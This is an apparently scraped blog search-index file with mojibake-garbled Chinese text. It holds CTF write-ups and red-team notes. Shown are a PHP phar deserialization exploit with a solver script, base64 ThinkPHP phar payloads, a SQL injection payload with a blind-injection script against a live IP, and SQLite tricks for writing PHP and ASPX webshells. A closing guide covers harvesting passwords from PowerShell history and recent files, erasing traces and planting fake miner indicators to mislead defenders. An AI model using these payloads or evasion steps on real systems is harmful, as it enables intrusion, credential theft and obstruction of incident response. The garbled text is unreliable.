}}header(&quot;Content-type: text/html;charset=utf-8&quot;);$ip=$_SERVER['REMOTE_ADDR'];$find_this = create_function(&quot;&quot;, 'die(`cat /flag`);');error_reporting(0);$filename = $_GET['filename'];if (!$_GET['ip']){ echo $ip;}if ($filename == NULL){ die();}if (file_exists($filename)){ echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;è¯¥æ–‡ä»¶å­˜åœ¨&quot;);&lt;/script&gt;';}else{ echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;è¯¥æ–‡ä»¶ä¸å­˜åœ¨&quot;);&lt;/script&gt;';} å¾ˆæ˜æ˜¾æ˜¯pharååºåˆ—åŒ–ï¼Œfile_existsè§¦å‘ï¼Œç„¶åuploadè¿‡æ»¤äº†ä¸€ç³»åˆ—å†…å®¹ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨taræ–‡ä»¶è¿›è¡Œååºåˆ—åŒ– &lt;?phpclass name1{ public $var; public function __destruct(){ echo $this-&gt;var; }}class name2{ public function __toString(){ $_POST[&quot;func&quot;](); return &quot;&quot;; }}$obj=new name1();$b=new name2();$obj-&gt;var=$b;@unlink(&quot;test.tar&quot;);$phar = new PharData(&quot;get_flag.tar&quot;);$phar[&quot;AAABshpik&quot;] = &quot;FLAGFLAGFLAG&quot;;$phar-&gt;setMetadata($obj); ç„¶åæ”¹åç¼€ä¸ºjpgå°±è¡Œäº†ï¼Œä½†å…¶å®æœ‰ä¸ªé—®é¢˜ï¼Œè¿™é‡Œä¸æ˜¯å¯¹taræ–‡ä»¶è¿›è¡Œæ“ä½œåˆ¤æ–­æ˜¯å¦æœ‰é‚£ä¸ªå­—ç¬¦äº†å—ï¼Ÿ exec(&quot;tar -tf &quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$r_array);if(in_array(&quot;.phar/.metadata&quot;,$r_array)){ return false;}return true; è®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ -tæˆ–â€“list åˆ—å‡ºå¤‡ä»½æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œè¿™ä¸ªtarçš„æ–‡ä»¶å†…å®¹æœ‰ä¸¤éƒ¨åˆ†ï¼Œä»–åªæ£€æµ‹äº†ç¬¬ä¸€éƒ¨åˆ†â€“ï¼Œæ‰€ä»¥å°±è½»è€Œæ˜“ä¸¾çš„ç»•è¿‡äº†ç„¶ååé¢åœ¨æœ¬åœ°çœ‹ä¸€ä¸‹æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œåˆ©ç”¨existsé¡µé¢çš„$ip=$_SERVER[â€˜REMOTE_ADDRâ€™];è¿™ä¸ªè¾“å‡ºå†…å®¹åŠ ä¸Šé‚£ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5è§£ç ä¸€ä¸‹å°±å¯ä»¥ï¼Œç„¶åå®Œæ•´ç›®å½•æ˜¯ /upload/xxxxx.gif ç„¶ååœ¨existsé¡µé¢ä½¿ç”¨pharåè®®è¿›è¡Œè®¿é—® phar://./upload/xxx.gif ä½†æ˜¯åŒæ—¶è¦ä¼ å‚ï¼Œè¿™é‡Œéœ€è¦å»æ‰§è¡Œé‚£ä¸ªcreate_function $find_this = create_function(&quot;&quot;, 'die(`cat /flag`);'); ç½‘ä¸Šæœ‰æ–‡ç«  ä»£ç å¾ˆç®€æ´ç²—æš´ï¼Œå¼€å¤´å°±åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œå¯ä»¥æŸ¥çœ‹flagã€‚create_functionç”Ÿæˆçš„å‡½æ•°åæœ‰äº›ç‰¹æ®Šï¼Œå®ƒæ˜¯NULLå­—ç¬¦åŠ ä¸Šâ€lambda_â€å†åŠ ä¸ªä¸€ä¸ªæ•°å­—æ ‡è¯†ï¼ˆ\\x00lambda_æ•°å­—æ ‡è¯†ï¼‰ï¼Œå…¶ä¸­æ•°å­—æ ‡è¯†ä»£è¡¨å®ƒæ˜¯å½“å‰è¿›ç¨‹ä¸­çš„ç¬¬å‡ ä¸ªåŒ¿åå‡½æ•°ã€‚create_functionçš„å®ç°æ­¥éª¤å¦‚ä¸‹ï¼šè·å–å‚æ•°, å‡½æ•°ä½“æ‹¼å‡‘ä¸€ä¸ªâ€function __lambda_func (å‚æ•°) { å‡½æ•°ä½“;} â€œçš„å­—ç¬¦ä¸²evalä¹‹é€šè¿‡__lambda_funcåœ¨å‡½æ•°è¡¨ä¸­æ‰¾åˆ°evalåå¾—åˆ°çš„å‡½æ•°ä½“, æ‰¾ä¸åˆ°å°±å‡ºé”™å®šä¹‰ä¸€ä¸ªå‡½æ•°å:â€\\000_lambda_â€ . count(anonymous_functions)++ç”¨æ–°çš„å‡½æ•°åæ›¿æ¢__lambda_func https://www.shawroot.cc/631.html ç›´æ¥åˆ«äººè„šæœ¬è·‘å°±å¥½äº† import requestsi = 0while True: r = requests.get('http://471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81/?func_name=%00lambda_1') if 'flag' in r.text: print(r.text) break i += 1 print(i) ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯postè¯·æ±‚ï¼Œæ‰€ä»¥è¦æ”¹æ”¹ import requestsi = 0data={&quot;func&quot;:&quot;%00(è¿™ä¸ª%00è¿›è¡Œurlè§£ç ä»¥åå†å‘é€è¿‡å»)lambda_1&quot;}while True: r = requests.post('http://471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81/?filename=phar://./upload/xxxx.gif',) if 'flag' in r.text: print(r.text) break i += 1 print(i) ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº† mimic-ssrfæ¢æµ‹åˆ°7410æ˜¯phpçš„ç«¯å£8888ç«¯å£æ˜¯goçš„ç«¯å£8080æ˜¯java æ„Ÿè§‰æ˜¯è¦è¯»æ–‡ä»¶æ‰èƒ½å¾€ä¸‹åšï¼Œä½†æ˜¯ä¸çŸ¥é“å•¥èƒ½è¯»æ–‡ä»¶ /proc/[pid]/cmdline æ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶ï¼ŒåŒ…å«è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œä¿¡æ¯ã€‚å¦‚æœè¯¥è¿›ç¨‹å·²ç»è¢«äº¤æ¢å‡ºå†…å­˜æˆ–è€…è¿™ä¸ªè¿›ç¨‹æ˜¯ zombie è¿›ç¨‹ï¼Œåˆ™è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰ä»»ä½•å†…å®¹ã€‚è¯¥æ–‡ä»¶ä»¥ç©ºå­—ç¬¦ null è€Œä¸æ˜¯æ¢è¡Œç¬¦ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š çœ‹äº†ä¸€ä¸‹wpæ‰å‘ç°åŸæ¥è¿˜æœ‰è¿™ä¸ªï¼Œ å½“æ—¶åœ¨çˆ†ç ´ç›®å½•çš„æ—¶å€™ï¼Œå°±åœ¨æƒ³cmdlineæ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯ä¸€æ—¶æ²¡æƒ³èµ·æ¥ï¼Œå“ï¼Œè¿˜æ˜¯å¤ªå¹´è½»äº†ï¼Œæ„Ÿè§‰å¾—æ‰¾ä¸ªæ—¶é—´å†å¥½å¥½æ€»ç»“ä¸€ä¸‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å»çˆ†ç ´è¯»å–ä¸€ä¸‹ï¼Œçœ‹çœ‹å¯¹åº”è¯­è¨€çš„æºç  /web/java/jdk1.8.0_202/bin/java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=20211 -jar /web/java/Hello_web.jar /web/python/app.py /web/golang/ssrf_go","link":"/2021/11/29/2021i%E6%98%A5%E7%A7%8B%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"},{"title":"2021å®‰æ´µæ¯","text":"æ‰«æ å‘ç°æ˜¯æ˜¯fastjson-1.2.47ï¼Œ JDK 1.3.1 easytp PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAE6ChYQQAAAAMfn/YtgEAAAAAAAB0ZXN0R8Un+dr04897mUVob2bLZdKmlRkCAAAAR0JNQg== PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAbLKhYQQAAAAMfn/YtgEAAAAAAAB0ZXN0X3PmDDRS4FHBGm6qipcoKSJ8JRECAAAAR0JNQg==PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAx6 hYQQAAAAMfn/YtgEAAAAAAAB0ZXN0FLfX2uY rTDjIvKfzYKxEr1rbNoCAAAAR0JNQg==PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAbLKhYQQAAAAMfn/YtgEAAAAAAAB0ZXN0X3PmDDRS4FHBGm6qipcoKSJ8JRECAAAAR0JNQg==","link":"/2021/11/27/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/"},{"title":"2021NCTF","text":"ezsqlæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,ä¹‹å‰hack.luåšè¿‡payloadæ˜¯ password=1%1$') or 1=1#&amp;name=a NCTF{3v3ryth1ng_not_fantast1c_:)} ç„¶åæ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„ç›²æ³¨äº† password=1%1$') or substr(database(),1,1)&gt;0#&amp;name=a payload=f&quot;1%1$') or substr(({change_pa}),{i},1)&gt;{mid}#&quot; è¡¨åï¼šNcTF,users import requestsurl=&quot;http://129.211.173.64:3080/login.php&quot;s=requests.session()def sql_in(change_pa): database = &quot;&quot; for i in range(1,10000): low=0 high=264 mid = (low + high) // 2 while (low &lt; high): payload=f&quot;1%1$') or ascii(substr(({change_pa}),{i},1))&gt;{mid}#&quot; data={&quot;password&quot;:payload,&quot;name&quot;:&quot;a&quot;} r=s.post(url=url,data=data).text #print(data) #print(r) if &quot;NCTF{3v3ryth1&quot; in r: low=mid+1 else: high=mid mid=(low+high)//2 if (mid == 0 or mid == 264): break database += chr(mid) print(database)if __name__==&quot;__main__&quot;: #data=&quot;database()&quot; #data=&quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot; #data = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x4e635446' data='select/**/`fl@g`/**/from/**/NcTF limit 1,1' #data=&quot;version()&quot; sql_in(data)","link":"/2021/11/29/2021NCTF/"},{"title":"sqliteæ•°æ®åº“å­¦ä¹ ","text":"å‰è¨€æœ€è¿‘é‡åˆ°è›®å¤šsqliteæ•°æ®åº“çš„ï¼Œæ„Ÿè§‰ä¹Ÿæ˜¯mysqlè€ƒçƒ‚äº†å§ï¼Œæ‰€ä»¥è¿™é‡Œæ¥æ€»ç»“ä¸€ä¸‹ sqliteä½¿ç”¨æŒ‡ä»¤è§£é‡Š attach database 'a' as 'b';åˆ›å»ºä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶aå‘½åä¸ºbè”ç³»åœ¨å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ä¸‹ åˆ›å»ºæ•°æ®åº“ sqlite3.exe æ•°æ®åº“å.dbé™„åŠ æ•°æ®åº“çš„åŸºæœ¬è¯­æ³•æ˜¯ï¼šATTACH DATABASE 'DatabaseName' As 'Alias-Name';ã€‚å¦‚æœæ•°æ®åº“å°šæœªè¢«åˆ›å»ºï¼Œè¿™ä¸ªå‘½ä»¤å°†åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“å·²å­˜åœ¨ï¼Œåˆ™æŠŠæ•°æ®åº“æ–‡ä»¶åç§°ä¸é€»è¾‘æ•°æ®åº“ â€˜Alias-Nameâ€™ ç»‘å®šåœ¨ä¸€èµ·ã€‚ä¾‹å¦‚é™„åŠ ä¸€ä¸ªbb.dbçš„æ•°æ®åº“ï¼Œåˆ«åä¸ºaï¼Œå‘½ä»¤ä¸ºï¼šattach database 'd:\\\\sqlite\\\\bb.db' as 'a';ã€‚ åˆ›å»ºè¡¨å¹¶æ’å…¥æ•°æ® create table a.tt(dataz text); INSERT into a.tt(dataz) VALUES ('test'); sqliteå¯ä»¥ç”Ÿæˆä»»æ„åç¼€çš„æ•°æ®åº“æ–‡ä»¶ä¾‹å¦‚åˆ›å»ºä¸€ä¸ªphpç»“å°¾çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–°å»ºä¸€ä¸ªåä¸ºexpçš„è¡¨ï¼Œå¹¶åœ¨å…¶ä¸­æ’å…¥æ•°æ®ï¼Œå†…å®¹ä¸ºï¼š&lt;?php phpinfo();?&gt;ã€‚ å…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š ATTACH DATABASE 'D:\\xxx\\www\\234.php' AS test2 ;create TABLE test2.exp (dataz text) ; insert INTO test2.exp (dataz) VALUES ('&lt;?php phpinfo();?&gt;');-- æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ç«Ÿç„¶å¯ä»¥è·¨ç›®å½•åˆ›å»ºï¼Œé‚£ä¹ˆå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åˆ›å»ºä»»æ„æ–‡ä»¶ï¼Œè¿™ä¹Ÿå°†ä¸ºæˆ‘ä»¬å†™shellæ„é€ äº†å…¶ä»–æ–¹æ³•,å‰ææ˜¯éœ€è¦çŸ¥é“ä¸€ä¸ªç»å¯¹è·¯å¾„ åŒæ ·çš„æ–¹æ³•ç”Ÿæˆaspxåç¼€çš„æ•°æ®åº“æ–‡ä»¶ï¼Œåˆ›å»ºè¡¨ï¼Œå¹¶æ’å…¥&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;ã€‚ç„¶åå°†è¯¥æ–‡ä»¶æ”¾åœ¨IISæœåŠ¡çš„webç›®å½•ã€‚å‘ç°å…¶ä¸­çš„APSXä»£ç ä¹Ÿä¼šè¢«è§£æã€‚ å†™shellæ—¶é‡åˆ°ç‰¹æ®Šå­—ç¬¦å¤„ç†æ–¹æ³•1.ä½¿ç”¨åå…­è¿›åˆ¶è¿›è¡Œå†™å…¥ 2.SQLiteä¸­åå…­è¿›åˆ¶çš„å†™æ³•ä¸ºï¼šx'....'ï¼Œè€Œä¸æ˜¯0x....ã€‚ å‚è€ƒ:https://fuping.site/2017/07/19/SQLite-Injection-Get-WebShell/ æŸ¥è¯¢æŒ‡ä»¤sqliteä¸­å¯ä»¥æŸ¥è¯¢çš„æ•°æ®åº“æœ‰ sqlite_master,sqlite_temp_master,sqlite_schema,sqlite_temp_schema select sqlite_version();select sql from sqlite_master;select sql from sqlite_master where type='';select sql from sqlite_master where type='' and name =''; å¦‚æœæŸ¥å‡ºæ¥çš„viewï¼Œå¯ä»¥ç›´æ¥æŸ¥è¯¢ CREATE VIEW view_p_sum (Product, P_SUM) ASSELECT Product, Price*Quantity FROM p_orders GROUP BY Product;##å¯ä»¥ä½¿ç”¨select * from view_p_sum","link":"/2021/12/09/sqlite%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"title":"è“é˜Ÿæ—¥å¿—æº¯æº","text":"windwosä¸»æœºä¿¡æ¯æ”¶é›†Windowsä¸»æœºä¿¡æ¯æ”¶é›†powershellå‘½ä»¤å†å²è®°å½•å¯ä»¥ä½¿ç”¨powershellè¿›è¡ŒæŸ¥çœ‹ powershell Get-Content (Get-PSReadlineOption).HistorySavePath æŸäº›æƒ…å†µä¸‹ï¼Œè¯¥å‘½ä»¤å¯èƒ½æ— æ³•ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯å…ˆç”¨diræŸ¥çœ‹powershellå†å²å‘½ä»¤è®°å½•æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼Œç„¶åä½¿ç”¨typeè¿›è¡Œè¯»å– %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt%appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt PSï¼šæ‰“ç‚¹æ—¶é‡åˆ°Windowsç¯å¢ƒçš„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œå¯ä¸‹è½½ä»¥ä¸‹æ–‡ä»¶è¿›è¡Œæ•æ„Ÿä¿¡æ¯ç¿»é˜…ï¼ŒæŸäº›è¿ç»´ä¼šä½¿ç”¨powershellè¿›è¡Œç®¡ç†å·¥ä½œç»„æˆ–åŸŸå†…æœºå™¨ï¼Œè¿æ°”å¥½çš„å¯ä»¥æ‰¾åˆ°sshã€æ•°æ®åº“è¿™ç±»ç™»å½•å¯†ç æˆ–å…¶å®ƒé‡è¦æ–‡ä»¶ï¼Œå°¤å…¶æ˜¯ä¸€äº›è¿ç»´ç”¨çš„è„šæœ¬ï¼Œé‡Œé¢å¤§å¤šåŒ…å«ä¸»æœºã€æ•°æ®åº“ç™»å½•å¯†ç ï¼Œå¯é€šè¿‡powershellå†å²è®°å½•æ‰¾åˆ°è¿™äº›è„šæœ¬çš„ç»å¯¹è·¯å¾„ï¼Œç„¶ååœ¨ä½¿ç”¨æ–‡ä»¶ä¸‹è½½æ¼æ´è¿›è¡Œè¯»å–ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„çªç ´ç‚¹ï¼Œè€Œä¸”è¿™äº›å†å²å‘½ä»¤å¤§å¤šåŒ…å«é“¾æ¥ä¸»æœºä¿¡æ¯ï¼Œå¯æå–é‡Œé¢çš„IPæ®µï¼Œæ‰©å®½æˆ‘ä»¬çš„æ”»å‡»é¢ã€‚ C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt æ¸—é€ç»“æŸæ—¶ï¼Œå¦‚æœä½¿ç”¨è¿‡powershellçš„ï¼ŒåŠ¡å¿…æ¸…é™¤powershellå‘½ä»¤å†å²è®°å½•ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥å‡å°‘è¢«æº¯æºæˆåŠŸçš„æ¦‚ç‡ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥è¿·æƒ‘è“é˜Ÿï¼Œå†™å…¥ä¸€äº›å¥‡æ€ªçš„å‘½ä»¤ï¼Œä¾‹å¦‚æŠŠä¸Šçº¿çš„C2åœ°å€æ›´æ”¹ä¸ºå¢ƒå¤–çš„å·²å…¬å¼€IOCæƒ…æŠ¥çš„æŒ–çŸ¿IPï¼Œç„¶åä¸¢è¿›æ¥å‡ ä¸ªæŒ–å‘æ ·æœ¬ï¼Œè¯¯å¯¼è“é˜Ÿè¿›è¡Œæº¯æºæ¶ˆè€—é˜²å®ˆæ–¹çš„ç²¾åŠ›ï¼Œä¼ªé€ ç—•è¿¹çš„æ—¶å€™è®°å¾—æ›´æ”¹æ–‡ä»¶æ—¶é—´ï¼Œè¿˜å¾—æ³¨æ„ä¸‹è¯­è¨€æ–‡å­—è¿™äº›ç»†èŠ‚ï¼Œä¸ç„¶è“é˜Ÿçœ‹åˆ°ä¸­æ–‡åå­—ã€é”™è¯¯è¯­æ³•å’Œæ—¶é—´çš„æŒ–çŸ¿ï¼Œç»“åˆæ”»é˜²æ¼”ç»ƒæ—¶é—´ï¼Œç¬¬ä¸€æ—¶é—´è‚¯å®šä¼šçŸ¥é“è¿™æ˜¯ä¼ªé€ å‡ºæ¥çš„ï¼Œå¦‚æœå†…ç½‘å­˜åœ¨IDSè¿™æ ·çš„æµé‡å®¡è®¡è®¾å¤‡ï¼Œè“é˜Ÿä¸€å®šä½æœºå™¨æŸ¥çœ‹è®¾å¤‡æµé‡ï¼Œè¯´ä¸å®šè¿˜å¯èƒ½æš´éœ²æˆ‘ä»¬çš„è¸ªè¿¹ è¿™ç›®å½•é‡Œé¢æ”¾ç€ç”µè„‘çš„å†å²æ‰“å¼€æ–‡ä»¶è®°å½•ï¼Œçœ‹è¿‡ä»€ä¹ˆæ–‡ä»¶ã€ä»€ä¹ˆæ—¶å€™ï¼ŒåŒ…æ‹¬ç‚¹è¿‡é‚£å‡ ä¸ªç›˜ï¼Œéƒ½å¾ˆè¯¦ç»†çš„è®°å½•ï¼Œæˆ‘ä»¬å¯é€šè¿‡è¯¥ç›®å½•å®šä½è¿ç»´å¸¸ç”¨çš„æ–‡ä»¶å¤¹ã€æ–‡ä»¶ç­‰ï¼Œå¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼ŒæŸ¥çœ‹è¿™ä¸ªç›®å½•å¾€å¾€æœ‰å¥‡æ•ˆï¼Œå¾ˆå¤šæ—¶å€™è¿ç»´ä¸ºäº†æ–¹ä¾¿ç®¡ç†æœºå™¨å–œæ¬¢ç”¨å¯†ç å°æœ¬æœ¬æ¥è®°å½•å„ä¸ªæœºå™¨çš„å¯†ç ï¼Œæ¯•ç«Ÿä¸€ä¸ªè¿ç»´ç®¡ç†å‡ åå°æœºå™¨æ˜¯éå¸¸å¸¸è§ï¼Œè¿™ä¹ˆå¤šå¯†ç ä¸ä¸€å®šè®°å¾—ä½ï¼Œæ‰€ä»¥å¤§å¤šæ•°è¿ç»´ä¼šé€‰æ‹©æŠŠæœºå™¨å¯†ç è®°å½•åœ¨txtã€xlsè¿™ç§æ–‡ä»¶é‡Œï¼Œè¿™ä¹Ÿå°±ç»™äº†æˆ‘ä»¬å¯ä¹˜ä¹‹æœºï¼Œå…¶å®æˆ‘åœ¨è¿™ä¸ªç›®å½•é‡åˆ°æœ€å¤šçš„è¿˜æ˜¯è¿ç»´å†™çš„æ—¥æŠ¥ã€å‘¨æŠ¥ï¼Œå¾ˆå¤šæ—¶å€™è¿™äº›æŠ¥å‘Šé‡Œé¢åŒ…å«äº†å¤§é‡æœåŠ¡å™¨ä¿¡æ¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™äº›æ•æ„Ÿä¿¡æ¯è¿›ä¸€æ­¥å†…ç½‘æ¨ªå‘ã€‚ recent å¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬çš„èµ·ç‚¹éƒ½æ˜¯webshellæƒé™ï¼Œå¦‚æœæ²¡æœ‰åˆ¤æ–­ç®¡ç†å‘˜æ˜¯å¦åœ¨çº¿ï¼Œæ˜¯å¦æœ‰IDSè¿™ç§æµé‡æ£€æµ‹è®¾å¤‡ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸€æ—¶é—´æœ€å¥½ä¸è¦å†’ç„¶è¿œç¨‹è¿‡å»ï¼Œä¸ç„¶å°±æ˜¯å¾—ä¸å¿å¤±äº†ï¼›recentæ— æ³•ä½¿ç”¨ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨dirè¯»å–å†å²æ‰“å¼€æ–‡ä»¶ï¼Œç„¶åå†åˆ©ç”¨diræœç´¢å…³é”®å­—å¾—åˆ°æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨webshellä¸­è¿›è¡ŒæŸ¥çœ‹æˆ–ä¸‹è½½å›æ¥æœ¬åœ°æ‰“å¼€äº†ã€‚ dir %APPDATA%\\Microsoft\\Windows\\Recentdir C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recentdir /a /s /b c:\\password.txt å…¶å®ƒçš„å¸¸ç”¨å…³é”®å­—æœç´¢ï¼Œ dir /a /s /b c:\\*.conf *.ini *.inc *.config dir /a /s /b c:\\conf.* config.* dir /a /s /b c:\\*.txt *.xls *.xlsx *.docxfindstr /s /i /n /d:C:\\ /c:&quot;pass&quot; *.config æŸäº›æ—¶å€™æ˜¾ç¤ºå†…å®¹è¿‡å¤šï¼Œå¯å¯¹è¿™äº›å…³é”®å­—è¿›è¡Œé€ä¸ªæœç´¢ï¼Œæˆ–ä½¿ç”¨findstrè¿›è¡Œè¿‡æ»¤ï¼Œå¦‚: dir /a /s /b c:\\*.conf *.ini *.inc *.config | findstr &quot;è¿ç»´&quot;dir /a /s /b c:\\*.txt *.xls *.xlsx *.docx | findstr &quot;å¯†ç &quot; å¦å¤–å¯åˆ°å›æ”¶ç«™ç¿»ç¿»ï¼Œå¾ˆå¤šæ—¶å€™ä¼šæœ‰æƒŠå–œã€‚ å‰é¢è¯´åˆ°äº†recentç›®å½•è®°å½•åˆ°äº†æŸ¥çœ‹å†å²æ‰“å¼€æ–‡ä»¶ï¼Œåœ¨åæ¸—é€æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šå¾€ç›®æ ‡æœºå­ä¸Šä¼ å„ç§æ–‡ä»¶ï¼Œä¾‹å¦‚npsã€mimikatzã€psexecç­‰ï¼Œè¿™äº›å·¥å…·åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¤§å¤šä¼šåœ¨recentç›®å½•äº§ç”Ÿè®°å½•ï¼Œè¿™æ—¶å€™ä¸ºäº†æ›´å¥½çš„éšè—ç—•è¿¹ï¼Œæˆ‘ä»¬å¯ä»¥rdå‘½ä»¤åˆ é™¤è¿è¡Œè®°å½•æˆ–ç›´æ¥ä½¿ç”¨CSæˆ–webshellç®¡ç†å·¥å…·æä¾›çš„æ–‡ä»¶ç®¡ç†åŠŸèƒ½åˆ é™¤è¯¥è®°å½•ï¼Œå¦å¤–psexecæˆåŠŸç™»å½•é€€å‡ºåï¼Œä¼šåœ¨ç›®æ ‡æœºå™¨çš„å®‰å…¨æ—¥å¿—ä¸­äº§ç”ŸEvent 4624ã€4628ã€4634ï¼Œåœ¨ç³»ç»Ÿæ—¥å¿—ä¸­äº§ç”ŸEvent 7045ï¼ˆè®°å½•PSEXESVCå®‰è£…ï¼‰ã€Event 7036ï¼ˆè®°å½•PSEXESVCæœåŠ¡çŠ¶æ€ï¼‰ï¼ŒWindowsæ—¥å¿—ä¹Ÿéœ€è¦å¤„ç†ä¸‹ï¼›å…³äºæ¸…ç†ç—•è¿¹ä¸æ˜¯æœ¬æ–‡çš„ä¸»é¢˜ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ï¼Œå¯¹äºåº”æ€¥çš„åŒå­¦å¯ä»¥å¤šå…³æ³¨ä¸‹recentæ–‡ä»¶å¤¹å’ŒWindowsæ—¥å¿—ï¼Œåœ¨ä¸æ‰‹åŠ¨æ¸…ç†æˆ–è€…ä½¿ç”¨æŸäº›å®‰å…¨å·¥å…·æ¸…ç†åƒåœ¾çš„æ—¶å€™ï¼Œrecentè¿™ä¸ªç›®å½•ä¸ºç©ºæˆ–è€…å¾ˆå°‘ä¸œè¥¿ï¼Œé‚£ä¹ˆåº”è¯¥è¦æ³¨æ„ä¸‹äº†ã€‚ rd /s æ–‡ä»¶ windows 